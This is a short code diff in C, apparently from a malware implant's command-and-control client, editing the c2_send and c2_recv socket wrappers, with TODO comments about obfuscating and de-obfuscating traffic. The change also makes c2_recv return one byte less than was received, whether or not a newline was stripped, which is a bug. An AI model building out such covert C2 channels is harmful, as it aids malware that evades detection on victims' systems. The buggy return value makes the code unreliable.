@@ -60,12 +60,21 @@ BOOL setup_comms() {
     return TRUE;
 }
 
-// TODO implement. Wrapper for socket send - needs obfuscation
+// Wrapper for socket send
 int c2_send(SOCKET s, char* data, int len) {
+
+    // TODO: needs dobfuscation here
     return send(s, data, len, 0);
 }
 
-// TODO implement. Wrapper for socket recv - needs de-obfuscation
+// Wrapper for socket recv
 int c2_recv(SOCKET s, char* buffer, int len) {
-    return recv(s, buffer, len, 0);
+    int num_bytes = recv(s, buffer, len, 0);
+
+    // TODO: needs de-obfuscation here
+
+    // Remove trailing newline
+    if(num_bytes >= 1 && buffer[num_bytes - 1] == '\n')
+        buffer[num_bytes - 1] = '\0';
+    return num_bytes - 1;
 }
